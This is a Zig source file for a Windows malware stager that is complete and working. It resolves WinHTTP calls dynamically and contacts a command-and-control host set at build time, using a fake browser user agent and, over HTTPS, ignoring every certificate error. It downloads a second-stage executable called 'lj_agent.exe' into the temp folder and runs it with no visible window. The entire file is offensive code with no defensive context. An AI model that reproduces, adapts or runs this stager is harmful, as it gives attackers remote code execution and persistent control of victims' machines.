const std = @import("std");
const build_options = @import("build_options");

// --- Minimal WinAPI for Stager ---
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const MAX_PATH: u32 = 260;

const LoadLibraryAFn = *const fn([*]const u8) callconv(.winapi) ?*anyopaque;
const GetProcAddressFn = *const fn(?*anyopaque, [*]const u8) callconv(.winapi) ?*anyopaque;

const WinHttpOpenFn = *const fn([*c]const u16, u32, [*c]const u16, [*c]const u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpConnectFn = *const fn(?*anyopaque, [*c]const u16, u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpOpenRequestFn = *const fn(?*anyopaque, [*c]const u16, [*c]const u16, [*c]const u16, [*c]const u16, ?*const [*c]const u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpSendRequestFn = *const fn(?*anyopaque, [*c]const u16, u32, ?*anyopaque, u32, u32, usize) callconv(.winapi) i32;
const WinHttpReceiveResponseFn = *const fn(?*anyopaque, ?*anyopaque) callconv(.winapi) i32;
const WinHttpReadDataFn = *const fn(?*anyopaque, ?*anyopaque, u32, *u32) callconv(.winapi) i32;
const WinHttpCloseHandleFn = *const fn(?*anyopaque) callconv(.winapi) i32;
const WinHttpSetOptionFn = *const fn(?*anyopaque, u32, ?*const anyopaque, u32) callconv(.winapi) i32;

const GetTempPathWFn = *const fn(u32, [*]u16) callconv(.winapi) u32;
const CreateFileWFn = *const fn([*:0]const u16, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) ?*anyopaque;
const WriteFileFn = *const fn(?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
const CloseHandleFn = *const fn(?*anyopaque) callconv(.winapi) i32;
const CreateProcessWFn = *const fn(?[*:0]const u16, ?[*:0]u16, ?*anyopaque, ?*anyopaque, i32, u32, ?*anyopaque, ?[*:0]const u16, *anyopaque, *anyopaque) callconv(.winapi) i32;

fn w(comptime s: []const u8) [*c]const u16 {
    return std.unicode.utf8ToUtf16LeStringLiteral(s);
}

pub fn main() !void {
    const kernel32 = std.os.windows.kernel32;
    const hWinHttp = kernel32.LoadLibraryA("winhttp.dll") orelse return;
    
    const WinHttpOpen: WinHttpOpenFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpOpen") orelse return);
    const WinHttpConnect: WinHttpConnectFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpConnect") orelse return);
    const WinHttpOpenRequest: WinHttpOpenRequestFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpOpenRequest") orelse return);
    const WinHttpSendRequest: WinHttpSendRequestFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpSendRequest") orelse return);
    const WinHttpReceiveResponse: WinHttpReceiveResponseFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpReceiveResponse") orelse return);
    const WinHttpReadData: WinHttpReadDataFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpReadData") orelse return);
    const WinHttpCloseHandle: WinHttpCloseHandleFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpCloseHandle") orelse return);

    const hSession = WinHttpOpen(w("Mozilla/5.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, null, null, 0) orelse return;
    defer _ = WinHttpCloseHandle(hSession);

    const hConnect = WinHttpConnect(hSession, w(build_options.c2_host), build_options.c2_port, 0) orelse return;
    defer _ = WinHttpCloseHandle(hConnect);

    const secure_flag = if (std.mem.eql(u8, build_options.c2_transport, "https")) WINHTTP_FLAG_SECURE else 0;
    const hRequest = WinHttpOpenRequest(hConnect, w("GET"), w("/stage"), null, null, null, secure_flag) orelse return;
    defer _ = WinHttpCloseHandle(hRequest);

    if (secure_flag != 0) {
        const WinHttpSetOption: WinHttpSetOptionFn = @ptrCast(kernel32.GetProcAddress(hWinHttp, "WinHttpSetOption") orelse return);
        const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
        const SECURITY_IGNORE_ALL_CERT_ERRORS: u32 = 0x00000100 | 0x00000200 | 0x00001000 | 0x00002000;
        var flags: u32 = SECURITY_IGNORE_ALL_CERT_ERRORS;
        _ = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, @sizeOf(u32));
    }

    if (WinHttpSendRequest(hRequest, null, 0, null, 0, 0, 0) == 0) return;
    if (WinHttpReceiveResponse(hRequest, null) == 0) return;

    // Download to temp file and execute
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    _ = arena.allocator(); // Keep for future use if needed, but underscore to ignore unused error

    var temp_path: [MAX_PATH]u16 = undefined;
    const GetTempPathW: GetTempPathWFn = @ptrCast(kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll").?, "GetTempPathW") orelse return);
    _ = GetTempPathW(MAX_PATH, &temp_path);

    const suffix = w("lj_agent.exe");
    var full_path: [MAX_PATH]u16 = undefined;
    var i: usize = 0;
    while (temp_path[i] != 0) : (i += 1) { full_path[i] = temp_path[i]; }
    var j: usize = 0;
    while (suffix[j] != 0) : (j += 1) { full_path[i + j] = suffix[j]; }
    full_path[i + j] = 0;

    const CreateFileW: CreateFileWFn = @ptrCast(kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll").?, "CreateFileW") orelse return);
    const hFile = CreateFileW(@ptrCast(&full_path), 0x40000000, 0, null, 2, 0, null) orelse return;
    defer _ = kernel32.CloseHandle(hFile);

    var chunk: [4096]u8 = undefined;
    var bytes_read: u32 = 0;
    const WriteFile: WriteFileFn = @ptrCast(kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll").?, "WriteFile") orelse return);
    while (true) {
        bytes_read = 0;
        if (WinHttpReadData(hRequest, &chunk, chunk.len, &bytes_read) == 0) break;
        if (bytes_read == 0) break;
        var written: u32 = 0;
        _ = WriteFile(hFile, &chunk, bytes_read, &written, null);
    }

    _ = kernel32.CloseHandle(hFile);

    // Execute
    const CreateProcessW: CreateProcessWFn = @ptrCast(kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll").?, "CreateProcessW") orelse return);
    var si: [104]u8 = std.mem.zeroes([104]u8);
    si[0] = 104;
    var pi: [24]u8 = std.mem.zeroes([24]u8);
    _ = CreateProcessW(@ptrCast(&full_path), null, null, null, 0, 0x08000000, null, null, &si, &pi);
}
